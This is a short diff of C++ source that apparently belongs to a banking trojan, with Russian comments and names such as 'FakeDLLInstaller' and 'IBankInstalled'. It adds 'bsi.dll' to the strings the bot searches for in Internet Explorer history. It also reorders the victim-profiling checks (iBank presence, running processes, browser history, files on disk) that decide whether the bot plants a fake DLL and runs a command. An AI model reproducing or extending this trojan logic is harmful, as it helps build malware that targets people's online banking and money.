@@ -45,7 +45,7 @@ namespace FKI_DEBUGER
 	char HISANALIZER_LINKS[BOTPARAM_SIZE_HISANALIZERLINKS] = BOTPARAM_HISANALIZERLINKS;
 #else
 	// Для отладки
-    char HISANALIZER_LINKS[] = "yandex\0mail.ru\0\0";
+    char HISANALIZER_LINKS[] = "yandex\0mail.ru\0bsi.dll\0\0";
 #endif
 //-----------------------------------------------------------
 
@@ -814,11 +814,9 @@ namespace FDI
         FKIDBG("FakeDLLInstaller", "Определяем необхдимость установки FakeDll");
 
 		bool Executed = IBankInstalled() ||
-						SearchProcesses() ||
-						CheckFiles();
+						SearchProcesses();
 
-
-
+		// Проверяем историю навигации ие
 		if (!Executed)
 		{
 			TBotStrings Links;
@@ -828,7 +826,13 @@ namespace FDI
 
 			// Анализируем историю навигации
 			Executed = CheckIEHistory(Links);
-        }
+		}
+
+
+		// Последним этапом ищем файлы на диске
+		if (!Executed)
+			Executed = CheckFiles();
+
 
 		// В случае обнаружения вхождений, выполняем команду
 		if (Executed)
